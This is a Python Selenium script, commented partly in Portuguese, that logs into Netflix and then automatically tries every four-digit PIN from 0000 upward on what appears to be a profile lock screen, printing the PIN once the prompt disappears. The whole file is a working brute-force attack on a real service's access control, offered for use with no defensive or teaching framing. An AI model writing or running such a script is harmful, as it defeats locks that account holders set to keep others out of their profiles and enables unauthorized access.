from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException  
from time import sleep, time

def check_exists_by_xpath(xpath):
    try:
        browser.find_element_by_xpath(xpath)
    except NoSuchElementException:
        return False
    return True

login = 'your login'
password = 'your password'

browser = webdriver.Chrome() # Abre o Chrome
browser.get("https://www.netflix.com/") # Acessa o Whatapp

signIn = browser.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div/div[1]/div/a')
signIn.click()
sleep(.5)

emailId = browser.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[1]/div[1]/div/label/input')
emailId.send_keys(login)

passwordId = browser.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[2]/div[1]/div/label/input')
passwordId.send_keys(password)

signInButton = browser.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/form/button')
signInButton.click()

sleep(2)

browser.find_element_by_xpath('/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div/ul/li[2]/div/a').click()
sleep(1)

p1 = 0
p2 = 0
p3 = 0
p4 = -1

start = time()

while(check_exists_by_xpath("/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div[3]/div/input[1]")):

    p4 += 1
    if p4 == 10:
        p3 += 1
        p4 = 0
    if p3 == 10:
        p2 += 1
        p3 = 0
    if p2 == 10:
        p1 += 1
        p2 = 0
    if p1 == 10:
        print('FAILURE')
        break

    tP1 = str(p1)
    tP2 = str(p2)
    tP3 = str(p3)
    tP4 = str(p4)

    webdriver.ActionChains(browser).send_keys(tP1).perform()
    webdriver.ActionChains(browser).send_keys(tP2).perform()
    webdriver.ActionChains(browser).send_keys(tP3).perform()
    webdriver.ActionChains(browser).send_keys(tP4).perform()


    print(tP1 + tP2 + tP3 + tP4)

end = time()
actualPassword = tP1 + tP2 + tP3 + tP4
print("The password is", actualPassword)
print("It took", end - start, "s")
